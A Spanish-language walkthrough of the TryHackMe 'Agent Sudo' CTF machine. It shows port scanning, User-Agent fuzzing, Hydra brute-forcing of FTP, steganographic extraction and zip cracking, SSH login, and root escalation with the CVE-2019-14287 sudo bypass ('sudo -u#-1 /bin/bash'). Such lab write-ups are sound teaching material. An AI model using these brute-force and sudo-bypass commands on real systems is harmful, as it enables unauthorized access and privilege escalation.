---
title: Agent Sudo Writeup - TryHackMe
date: 2023-05-26
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, Brute Forcing, Hash Cracking, CVE-2019-14287, Steganography]
img_path: /assets/img/commons/agent_sudo/
image: agent_sudo.png
---

¡Hola!


En este write-up, exploraremos la máquina [**Agent Sudo**](https://tryhackme.com/room/agentsudoctf) de **TryHackMe**, la cual se clasifica como de dificultad fácil en la plataforma. Durante este desafío, llevaremos a cabo una enumeración web para identificar a un posible usuario, seguido de técnicas de fuerza bruta en el servicio FTP. Además, utilizaremos técnicas de esteganografía para descubrir la contraseña oculta del usuario en archivos multimedia, permitiéndonos acceder al servidor a través de SSH. Por último, escalaremos privilegios aprovechando un CVE.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.227.15
PING 10.10.227.15 (10.10.227.15) 56(84) bytes of data.
64 bytes from 10.10.227.15: icmp_seq=1 ttl=61 time=305 ms

--- 10.10.227.15 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 304.890/304.890/304.890/0.000 ms

```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.227.15 -oG allPorts.txt
Starting Nmap 7.93 ( <https://nmap.org> ) at 2023-05-26 23:00 -05
Nmap scan report for 10.10.227.15
Host is up (0.34s latency).
Not shown: 65159 closed tcp ports (reset), 373 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds

```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 21,22,80 -sV -sC --min-rate 5000 10.10.227.15 -oN services.txt
Starting Nmap 7.93 ( <https://nmap.org> ) at 2023-05-26 23:01 -05
Nmap scan report for 10.10.227.15
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 21.22 seconds
```

El reporte nos indica que la máquina víctima está ejecutando los servicios **FTP** (`vsftpd 3.0.3`), **SSH** (`OpenSSH 7.6p1`) y **HTTP** (`Apache httpd 2.4.29`).

### HTTP - 80

Al acceder al servicio web, nos encontramos con la siguiente página que muestra un mensaje: "Utilice su propio **codename** como **user-agent** para acceder al sitio. De, Agente R". Este mensaje podría ser una pista de que debemos modificar el encabezado del **user-agent** de la solicitud, utilizando una letra en mayúscula como "R", por ejemplo.

![web](web.png)

Procedemos a capturar la solicitud utilizando **Burp Suite** para observar cómo se procesa.

![request](request.png)

Enviamos la captura al módulo Repeater de Burp Suite para realizar cambios en el encabezado User-Agent. 

Al utilizar "A" como User-Agent, observamos que obtenemos el mismo resultado.

![user_agent](user_agent.png)

Con el fin de acelerar este proceso, creamos un diccionario que contenga todas las letras del abecedario en mayúscula. Luego, utilizamos el módulo Intruder de Burp Suite para realizar fuzzing con el ataque Sniper.

```bash
❯ cat /usr/share/seclists/Fuzzing/char.txt | tr a-z A-Z > dicc.txt
```

Establecemos la posición del payload en el valor del encabezado User-Agent.

![position](position.png)

En el apartado de Payloads, cargamos el diccionario previamente creado haciendo clic en el botón "Load..." y seleccionando el archivo correspondiente.

![payload](payload.png)

Iniciamos el ataque haciendo clic en el botón "Start Attack" y observamos los resultados obtenidos a continuación.

![results](results.png)

Como podemos observar, hemos obtenido dos respuestas interesantes que difieren del resto. En particular, la respuesta número 18 muestra el siguiente mensaje:

![18](18.png)

Por otro lado, en la respuesta número 3 hemos obtenido una redirección a un recurso con extensión `.php`, en el cual se nos muestra el siguiente mensaje: 

![3](3.png)

El mensaje revela información sobre el posible nombre del agente C, que sería **Chris**, y su contraseña, que es devil.

### FTP - 21

Dado que el servicio FTP está activo y tenemos conocimiento de que la contraseña del usuario **chris** es devil, podemos intentar realizar un ataque de fuerza bruta utilizando la herramienta **Hydra** para ver si tenemos suerte y podemos acceder al servicio.

```bash
❯ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.227.15 ftp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (<https://github.com/vanhauser-thc/thc-hydra>) starting at 2023-05-26 23:45:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking <ftp://10.10.227.15:21/>
[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
[21][ftp] host: 10.10.227.15   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (<https://github.com/vanhauser-thc/thc-hydra>) finished at 2023-05-26 23:47:01
```

Excelente, al obtener la contraseña del usuario **chris** para el servicio FTP, ahora podemos proceder a conectarnos al servidor. Después de iniciar sesión con las credenciales proporcionadas, al listar los archivos, obtenemos el siguiente resultado:

```bash
❯ ftp 10.10.227.15
Connected to 10.10.227.15.
220 (vsFTPd 3.0.3)
Name (10.10.227.15:juanr): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54207|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp>
```

Para descargar todos los archivos compartidos del servidor, puedes utilizar el siguiente comando:

```bash
wget -m ftp://chris:crystal@10.10.227.15
```

Si leemos el contenido del archivo `To_agentJ.txt`, obtenemos el siguiente mensaje:

```
❯ cat To_agentJ.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: To_agentJ.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Dear agent J,
   2   │ 
   3   │ All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a pro
       │ blem for you.
   4   │ 
   5   │ From,
   6   │ Agent C
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Se nos indica que la contraseña de acceso del agente **J** está oculta en una de las fotos falsas. Procedemos a extraer información adicional oculta en las imágenes utilizando la herramienta **steghide**. Sin embargo, nos encontramos con la solicitud de un salvoconducto, una especie de contraseña que desconocemos.

```bash
❯ steghide extract -sf cute-alien.jpg
Anotar salvoconducto:
steghide: no pude extraer ningn dato con ese salvoconducto!
```

Si utilizamos la herramienta **binwalk** para analizar el archivo `cute-alien.jpg`, parece que no se encuentra ningún contenido adicional oculto en el archivo.

```bash
❯ binwalk -e --run-as=root cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

Por otro lado, al analizar el archivo `cutie.png` con la herramienta **binwalk**, se revela la presencia de varios archivos ocultos en su interior.

```bash
❯ binwalk -e --run-as=root cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

El comando anterior crea el directorio `_cutie.png.extracted`, que contiene los archivos extraídos del archivo `cutie.png`.

```bash
❯ ls -l
.rw-r--r-- root root 273 KB Sat May 27 00:25:26 2023  365
.rw-r--r-- root root  33 KB Sat May 27 00:25:26 2023  365.zlib
.rw-r--r-- root root 280 B  Sat May 27 00:25:26 2023  8702.zip
.rw-r--r-- root root   0 B  Tue Oct 29 07:29:11 2019  To_agentR.txt
```

El archivo que más nos interesa es el archivo `8702.zip`. Sin embargo, al intentar descomprimirlo, se nos solicita una contraseña que desconocemos en este momento. En estos casos, podemos utilizar la utilidad **zip2john** para crear un hash que pueda ser interpretado por la herramienta **John the Ripper** y así intentar descifrar la contraseña.

```bash
❯ zip2john 8702.zip > zip_hash
```

Creado el hash, procedemos a utilizar la herramienta **John the Ripper** para intentar crackear la contraseña.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2023-05-27 00:40) 3.125g/s 76800p/s 76800c/s 76800C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

¡Enhorabuena! Hemos logrado obtener exitosamente la contraseña del archivo zip. Ahora podemos extraer el archivo `.zip` utilizando el siguiente comando, asegurándonos de proporcionar la contraseña que hemos obtenido previamente:

```bash
❯ 7z x 8702.zip
```

El archivo que se extrajo es `To_agentR.txt` y su contenido es el siguiente:

```bash
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: To_agentR.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Agent C,
   2   │
   3   │ We need to send the picture to 'QXJlYTUx' as soon as possible!
   4   │
   5   │ By,
   6   │ Agent R
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Al parecer, el mensaje contiene una cadena codificada en Base64. Si procedemos a decodificarla, obtendremos el siguiente resultado:

```bash
❯ echo 'QXJlYTUx' | base64 -d; echo
Area51
```

En el caso de intentar extraer información oculta de las imágenes con la herramienta **steghide** y se nos solicita un salvoconducto, podemos probar utilizando el texto "Area51" como salvoconducto. Si utilizamos este valor, es posible que tengamos éxito en el proceso de extracción de información adicional oculta en las imágenes.

```bash
❯ steghide extract -sf cute-alien.jpg
Anotar salvoconducto:
anot los datos extrados e/"message.txt".
```

¡Perfecto! El salvoconducto correcto nos ha permitido acceder al archivo de texto oculto. Si leemos el contenido del archivo `message.txt`, podremos ver el resultado obtenido.

```bash
❯ cat message.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: message.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Hi james,
   2   │
   3   │ Glad you find this message. Your login password is hackerrules!
   4   │
   5   │ Don't ask me why the password look cheesy, ask agent R who set this password for you.
   6   │
   7   │ Your buddy,
   8   │ chris
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

El archivo de texto revela la contraseña del usuario **James**, también conocido como Agente J.

## Explotación

Con el usuario y contraseña en nuestro poder, ahora podemos acceder a la máquina a través del protocolo SSH.

```bash
❯ ssh james@10.10.227.15
The authenticity of host '10.10.227.15 (10.10.227.15)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.227.15' (ED25519) to the list of known hosts.
james@10.10.147.245's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  <https://help.ubuntu.com>
 * Management:     <https://landscape.canonical.com>
 * Support:        <https://ubuntu.com/advantage>

 System information disabled due to load higher than 1.0

 * Kata Containers are now fully integrated in Charmed Kubernetes 1.16!
   Yes, charms take the Krazy out of K8s Kata Kluster Konstruction.

     <https://ubuntu.com/kubernetes/docs/release-notes>

75 packages can be updated.
33 updates are security updates.

Last login: Tue Oct 29 14:26:27 2019

james@agent-sudo:~$

```

Si listamos los archivos y directorios de la ruta actual, encontraremos la primera bandera de la máquina, así como un archivo de imagen con extensión `.jpg`.

```bash
james@agent-sudo:~$ ls -l
total 48
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92********************
```

Para cumplir con la tarea de descubrir cómo se llama el incidente de la foto en la plataforma **TryHackMe**, debemos compartir la imagen con la máquina atacante. Para hacerlo, utiliza el siguiente comando:

```bash
❯ sudo scp james@10.10.227.15:Alien_autospy.jpg .
james@10.10.147.245's password: 
Alien_autospy.jpg                                                                                                                                   100%   41KB  25.8KB/s   00:01
```

Ahora es el momento de realizar una búsqueda inversa de imágenes en https://images.google.com/. 

1. Haz clic en el icono de la cámara que se encuentra en la barra de búsqueda de Google Images.
2. A continuación, selecciona la opción "Subir una imagen" y elige la imagen que compartiste desde la máquina atacante.
3. Espera a que Google realice la búsqueda inversa de la imagen.
4. Examina los resultados y verifica si encuentras alguna coincidencia o información relevante sobre el nombre del incidente asociado a la imagen.

![alien](alien.png)

Encontramos información relevante en el sitio web de [foxnews.com](http://foxnews.com/), donde se indica que el incidente se llama "**Roswell alien autopsy**".

## Escalación de privilegios

En nuestro objetivo de escalar a privilegios de **root**, iniciamos listando los binarios que podemos ejecutar con permisos **SUDO**.

```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$
```

Obtenemos la salida `(ALL, !root) /bin/bash` al ejecutar el comando `sudo -l`, que significa que todos los usuarios excepto el usuario **root** pueden usar `/bin/bash`.

Al realizar una búsqueda en Google, se revela una página en **exploitdb** con referencia al **CVE-2019-14287**. 

Puedes encontrar más información sobre esta vulnerabilidad en el enlace proporcionado: [sudo 1.8.27 - Security Bypass - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/47502)

En resumen, la vulnerabilidad **CVE-2019-14287** es un error en **Sudo** que permite a un usuario con privilegios sudo ejecutar comandos como **root** incluso si la política de seguridad lo prohíbe. Esto se debe a que **Sudo** no verifica correctamente el ID de usuario cuando se usa el signo menos (`-`) para indicar el usuario objetivo.

Entonces, el atacante puede usar un ID de usuario negativo para invocar **sudo** con el usuario **root**. Por ejemplo `u#-1` devuelve 0 que es el id de **root**:

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
```

Al ejecutar el comando anterior, obtendremos acceso como usuario **root** y finalmente ingresaremos al directorio `/root` para leer la última flag.

```bash
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57********************

By,
DesKel a.k.a Agent R
```

!Happy Hacking!
